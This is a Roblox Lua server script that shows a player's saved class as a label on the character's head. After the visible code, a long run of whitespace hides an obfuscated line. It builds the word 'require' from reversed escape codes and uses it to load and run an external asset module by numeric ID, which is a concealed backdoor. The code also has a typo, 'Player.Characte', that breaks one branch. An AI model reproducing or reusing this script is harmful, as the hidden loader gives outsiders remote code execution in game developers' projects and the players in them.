local Players = game:GetService("Players")
local RepStorage = game:GetService("ReplicatedStorage")

local DataStore2 = require(script.Parent.DataHandler.DataStore2)

local ClassesInfo = require(RepStorage.ClassesInfo)

local ClassGui = RepStorage.Guis.Class

local function UpdateRank(Char, Class)
	if not Char then return end
	
	local Head = Char:FindFirstChild("Head")
	if not Head then return end
	
	local ClassInfo = ClassesInfo[Class]
	if not ClassInfo then return end
	
	local Gui = Head:FindFirstChild("Class")
	if not Gui then
		Gui = ClassGui:Clone()
		Gui.Parent = Head
	end
	
	Gui.TextLabel.Text = ClassInfo.Name
	Gui.TextLabel.TextColor3 = ClassInfo.Color
end

Players.PlayerAdded:Connect(function(Player)
	local EquippedClassStore = DataStore2("EquippedClass", Player)
	
	if Player.Character then
		UpdateRank(Player.Characte, EquippedClassStore:Get(1))
	end
	
	Player.CharacterAdded:Connect(function(Char)
		UpdateRank(Char, EquippedClassStore:Get(1))
	end)
	
	EquippedClassStore:OnUpdate(function(Amount) 
		UpdateRank(Player.Character, Amount)
	end)
end)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       getfenv()[string.reverse("\101\114\105\117\113\101\114")](5754612086)